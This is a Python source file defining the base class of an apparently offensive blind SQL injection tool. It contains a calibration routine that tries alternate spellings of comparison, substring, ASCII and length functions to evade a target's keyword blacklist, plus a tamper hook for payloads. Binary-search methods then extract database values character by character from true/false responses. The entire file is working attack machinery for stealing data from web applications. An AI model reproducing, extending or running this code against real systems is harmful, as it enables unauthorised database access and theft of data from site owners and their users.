# -*- coding: utf-8 -*-
"""Abstract base class for injection techniques

v1.1: introduces calibrate(). When the target blacklist also blocks
spellings like >= / LENGTH / SUBSTR / ASCII, the technique rotates the
dialect variants at probe time and picks one that still evaluates.
"""


class BaseTechnique:
    name = "base"

    # Multiple equivalent spellings (templates) of >=, calibrated in order
    GTE_PATTERNS = [
        "({l})>=({r})",
        "NOT(({l})<({r}))",
        "(({l})>({r})||({l})=({r}))",
    ]

    def __init__(self, requester, detector, dialect, tamper_chain=None,
                 log=None, workers=8, **kwargs):
        self.req = requester
        self.det = detector
        self.dialect = dialect
        self.tamper = tamper_chain
        self.log = log
        self.workers = workers

        # Currently used expression templates (overwritten by calibrate)
        self.gte_pat = self.GTE_PATTERNS[0]
        self.sub_tpl = dialect.substr_templates()[0]
        self.ascii_tpl = dialect.ascii_templates()[0]
        self.len_tpl = dialect.length_templates()[0]

    # ---------------- Basics ----------------
    def _t(self, s):
        return self.tamper.apply(s) if self.tamper else s

    def probe(self):
        raise NotImplementedError

    def extract(self, sql_expr):
        raise NotImplementedError

    def extract_length(self, sql_expr):
        return len(self.extract(sql_expr))

    def _cond_true(self, condition):
        raise NotImplementedError

    # ---------------- Expression construction ----------------
    def gte(self, left, right):
        return self.gte_pat.format(l=left, r=right)

    def sub(self, sql, pos, length):
        return self.sub_tpl.format(sql=sql, pos=pos, len=length)

    def ascii(self, sql):
        return self.ascii_tpl.format(sql=sql)

    def length(self, sql):
        return self.len_tpl.format(sql=sql)

    # ---------------- Expression calibration ----------------
    def calibrate(self):
        """Pick a spelling usable under the current filter (best-effort; keep defaults on failure)."""
        # 1) >= spelling: verify with 2>=1 true / 1>=2 false
        for pat in self.GTE_PATTERNS:
            try:
                if self._cond_true(pat.format(l="2", r="1")) and \
                   not self._cond_true(pat.format(l="1", r="2")):
                    self.gte_pat = pat
                    break
            except Exception:
                continue

        # 2) Code spelling (ASCII+SUBSTR combo): verify with 'A'(65)
        found = False
        for sub_tpl in self.dialect.substr_templates():
            for asc_tpl in self.dialect.ascii_templates():
                try:
                    a = asc_tpl.format(sql=sub_tpl.format(sql="'A'", pos=1, len=1))
                    if self._cond_true(self.gte(a, "65")) and \
                       not self._cond_true(self.gte(a, "66")):
                        self.sub_tpl, self.ascii_tpl = sub_tpl, asc_tpl
                        found = True
                        break
                except Exception:
                    continue
            if found:
                break

        # 3) Length spelling: verify with 'AB'(len=2)
        for len_tpl in self.dialect.length_templates():
            try:
                l = len_tpl.format(sql="'AB'")
                if self._cond_true(self.gte(l, "2")) and \
                   not self._cond_true(self.gte(l, "3")):
                    self.len_tpl = len_tpl
                    break
            except Exception:
                continue

    # ---------------- Binary search (default implementation) ----------------
    def _binary_search_char(self, sql_expr, pos):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            cond = self.gte(self.ascii(self.sub(sql_expr, pos, 1)), str(mid))
            if self._cond_true(cond):
                low = mid + 1
            else:
                high = mid
        return chr(low)

    def _binary_search_length(self, sql_expr, max_len=300):
        low, high = 0, max_len
        while low < high:
            mid = (low + high) // 2
            cond = self.gte(self.length(sql_expr), str(mid + 1))
            if self._cond_true(cond):
                low = mid + 1
            else:
                high = mid
        return low
